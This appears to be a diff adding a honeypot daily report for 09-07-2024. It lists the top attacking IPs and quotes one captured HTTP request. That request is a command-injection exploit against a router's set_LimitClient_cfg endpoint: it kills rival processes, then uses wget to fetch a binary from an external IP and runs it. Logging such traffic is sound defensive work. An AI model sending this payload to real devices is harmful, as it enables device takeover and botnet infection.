@@ -1,0 +1,29 @@
+Top 5 IPs for 09-07-2024 :
+
+120.195.31.102
+159.65.146.196
+103.77.215.101
+187.49.152.12
+24.159.119.172
+
+Malware Observed:
+
+None observed
+
+
+
+Commands/exploits observed:
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Host: <Host IP>
+User-Agent: Linux Gnu (cow)
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;killall -9 mpsl; killall -9 mipsel; killall -9 bash.mpsl; killall -9 mips; rm -rf blink; wget http://1.13.102.222/blink; chmod 777 blink; ./blink blink; rm -rf blink;
